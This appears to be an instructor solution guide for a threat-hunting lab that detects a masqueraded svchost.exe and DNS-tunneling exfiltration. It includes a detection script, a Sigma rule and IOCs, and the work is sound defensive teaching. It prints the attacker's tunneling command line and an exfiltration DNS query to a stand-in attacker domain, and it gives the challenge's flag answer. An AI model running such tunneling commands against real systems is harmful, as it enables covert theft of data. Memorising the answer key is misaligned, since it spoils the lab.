# 🎯 Instructor Solution Guide: Incident 0505 (Operation CloudSnoop)

### Threat Hunting: Living-off-the-Land Process Masquerading & DNS Tunneling Exfiltration

---

## 📌 Executive Summary

| Parameter                           | Details                                                                                                                                    |
| :---------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------- |
| **Incident ID**                     | `INC-0505-THREAT-HUNT`                                                                                                                     |
| **Target Host / Fleet**             | `FIN-WS-09` (Finance Workstation Subnet)                                                                                                   |
| **Threat Classification**           | TLP:AMBER \| Severity: **HIGH**                                                                                                            |
| **Primary MITRE ATT&CK Techniques** | **T1036.005** (Masquerading: Match Legitimate Name), **T1071.004** (DNS Tunneling), **T1048.003** (Exfiltration Over Alternative Protocol) |
| **Rogue Process**                   | `svchost.exe` executing from `C:\Users\jsmith\AppData\Local\Temp\`                                                                         |
| **Adversary Tool Parameters**       | `svchost.exe -tunnel -domain ns-tunnel.attacker-dns.org`                                                                                   |
| **Tunneling Domain**                | `ns-tunnel.attacker-dns.org`                                                                                                               |
| **Detection Metric**                | Shannon Entropy $H(X) = 5.02\text{ bits}$ (Normal Domain Baseline: 2.2–2.8 bits)                                                           |
| **Recovered Incident Flag**         | `FLAG{dns_tunneling_data_exfil_uncovered}`                                                                                                 |

During proactive threat hunting across endpoint telemetry and DNS resolver logs, security analysts uncovered an adversary leveraging process masquerading to blend in with legitimate Windows service hosts (`svchost.exe`). The rogue binary established an encrypted, high-entropy covert channel over port 53 (DNS) to bypass corporate HTTP/HTTPS inspection proxies and exfiltrate confidential employee payroll records chunk-by-chunk inside Base64 URL-safe subdomains.

---

## 🎯 Threat Hunting Methodology: Step-by-Step

Follow these sequential steps in the interactive Marimo notebook or in your SIEM / EDR hunting console:

### Step 1: Endpoint Process Masquerading Analysis (Sysmon Telemetry)

1. **Formulate Hunting Hypothesis**:
   - Adversaries often rename malicious tools to `svchost.exe`, `lsass.exe`, or `csrss.exe` to blend in with background operating system services.
   - Legitimate Windows `svchost.exe` is **strictly located in `C:\Windows\System32\`** or `C:\Windows\SysWOW64\`. Any execution from user directories (`AppData`, `Temp`, `Users`) indicates malicious masquerading (MITRE T1036.005).
2. **Filter Sysmon Process Telemetry**:
   - In **Step 1: Endpoint Process Masquerading Analysis**, inspect the process table with filter `svchost`.
3. **Isolate the Rogue Binary**:
   - Notice the prominent red alert callout:
     - **Process Name**: `svchost.exe` (PID: `4892`)
     - **Image Path**: `C:\Users\jsmith\AppData\Local\Temp\svchost.exe`
     - **User Context**: `CORP\jsmith`
     - **Parent Process**: `explorer.exe` (or user script)
     - **Command Line**:
       ```bat
       svchost.exe -tunnel -domain ns-tunnel.attacker-dns.org
       ```
   - _Key Analyst Insight_: The `-tunnel` parameter and `-domain ns-tunnel.attacker-dns.org` reveal that this is an iodine or dnscat2 style DNS tunneling client configured to route exfiltration packets through authoritative nameserver `ns-tunnel.attacker-dns.org`.

---

### Step 2: DNS Tunneling Shannon Entropy Analysis

1. **Understand DNS Shannon Entropy**:
   - Human-readable domain names (like `google.com`, `corp.internal`) exhibit low character entropy ($H \approx 2.0 - 3.0\text{ bits}$) due to standard vowel frequencies and word structures.
   - Covert tunneling protocols pack encrypted or compressed binary data into subdomains, resulting in high randomness ($H > 4.2\text{ bits}$).
2. **Tune the Entropy & Length Sliders**:
   - In **Step 2: DNS Tunneling Shannon Entropy Analysis**:
     - Increase the **Minimum Shannon Entropy (H)** slider to `4.0` (or `4.2`).
     - Set the **Minimum Query Length** slider to `30`.
3. **Filter by the Discovered Attacker Domain**:
   - In the `Domain Filter:` text box, type `attacker-dns.org`.
4. **Identify the Exfiltration Queries**:
   - Observe query:
     ```text
     exfil-payload.RkxBR3tkbnNfdHVubmVsaW5nX2RhdGFfZXhmaWxfdW5jb3ZlcmVkfQ.ns-tunnel.attacker-dns.org
     ```
   - **Query Length**: `88 characters`
   - **Shannon Entropy**: `5.02 bits`
   - **Resolver Response**: `198.51.100.99` (Adversary authoritative nameserver)

---

### Step 3: Subdomain Payload Reassembly & Decoding

1. **Extract the Subdomain Encoded Chunk**:
   - In **Step 3: Subdomain Payload Reassembly & Decoder Workbench**, notice that the Base64 URL-safe chunk between `exfil-payload.` and `.ns-tunnel` is automatically extracted:
     `RkxBR3tkbnNfdHVubmVsaW5nX2RhdGFfZXhmaWxfdW5jb3ZlcmVkfQ`
2. **Decode the Secret**:
   - The workbench applies URL-safe Base64 decoding with padding calculation:
     `base64.urlsafe_b64decode(chunk + "==")`
   - Decoded output:
     ```text
     FLAG{dns_tunneling_data_exfil_uncovered}
     ```

---

### Step 4: Flag Verification & Submission

1. **Verify the Flag**:
   - In **Step 4: Verify Incident Flag & Hunt Findings**, input:
     `FLAG{dns_tunneling_data_exfil_uncovered}`
   - Confirm the green verification card: `🎉 FLAG VERIFIED CORRECT!`.
2. **Submit to Portal**:
   - Copy `FLAG{dns_tunneling_data_exfil_uncovered}` into the CyberLab challenge submission pane to claim 200 points.

---

## 🐍 Standalone Python Threat Hunting Script

To reproduce this hunt on raw CSV logs programmatically:

```python
import base64
import math
from pathlib import Path
import pandas as pd
import re

data_dir = Path("data")

# 1. Detect Masqueraded Processes in Sysmon Telemetry
df_proc = pd.read_csv(data_dir / "sysmon_processes.csv")
rogue = df_proc[
    df_proc["image"].str.endswith("svchost.exe", na=False)
    & ~df_proc["image"].str.startswith("C:\\Windows\\System32\\", na=False)
]
for _, row in rogue.iterrows():
    print(f"[!] Masqueraded Process Detected: {row['image']} -> {row['command_line']}")

# 2. Calculate Shannon Entropy on DNS Queries
def shannon_entropy(s):
    prob = [float(s.count(c)) / len(s) for c in dict.fromkeys(s)]
    return -sum([p * math.log(p) / math.log(2.0) for p in prob])

df_dns = pd.read_csv(data_dir / "dns_queries.csv")
df_dns["entropy"] = df_dns["query_name"].apply(shannon_entropy)

# 3. Filter high-entropy queries for attacker-dns.org
tunnel_queries = df_dns[df_dns["query_name"].str.contains("attacker-dns.org", na=False)]
for _, row in tunnel_queries.iterrows():
    print(f"[>] Query (Entropy: {row['entropy']:.2f}): {row['query_name']}")
    match = re.search(r"exfil-payload\.([A-Za-z0-9_-]+)\.", row["query_name"])
    if match:
        raw_b64 = match.group(1)
        padded = raw_b64 + "=" * (-len(raw_b64) % 4)
        flag = base64.urlsafe_b64decode(padded).decode("utf-8")
        print(f"[+] Decoded Exfiltrated Flag: {flag}")
```

---

## 📋 Indicators of Compromise (IOCs)

| Indicator Type              | Value                                                  | Context                                               |
| :-------------------------- | :----------------------------------------------------- | :---------------------------------------------------- |
| **Masqueraded File**        | `C:\Users\jsmith\AppData\Local\Temp\svchost.exe`       | Rogue DNS tunneling executable                        |
| **C2 Tunneling Domain**     | `ns-tunnel.attacker-dns.org`                           | Authoritative DNS nameserver receiving covert channel |
| **Adversary Nameserver IP** | `198.51.100.99`                                        | External nameserver IP resolving tunneling requests   |
| **Channel Characteristics** | Shannon Entropy: `5.02 bits`, Label Length: `88 bytes` | High-entropy Base64 data chunks                       |

---

## 🛡️ Detection Engineering & Threat Hunting Rules

### Sigma Rule: Process Masquerading for `svchost.exe`

```yaml
title: Suspicious svchost.exe Execution Outside System32
status: experimental
description: Detects execution of svchost.exe from paths outside the Windows System32 directory.
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\svchost.exe'
  filter:
    Image|startswith:
      - 'C:\Windows\System32\'
      - 'C:\Windows\SysWOW64\'
  condition: selection and not filter
level: high
tags:
  - attack.defense_evasion
  - attack.t1036.005
```

### DNS Egress Hardening & Response Actions

1. **DNS Firewall Policy**: Restrict internal endpoints from issuing direct recursive queries to external DNS servers. Force all endpoints to route exclusively through hardened internal DNS resolvers with DNS RPZ (Response Policy Zones).
2. **Query Length & Entropy Thresholds**: Configure SIEM alerting on DNS queries exceeding 60 characters with Shannon entropy $H > 4.0$.
3. **Endpoint Remediation**: Kill process PID 4892, purge `C:\Users\jsmith\AppData\Local\Temp\svchost.exe`, and inspect host `FIN-WS-09` for initial vector dropper artifacts.
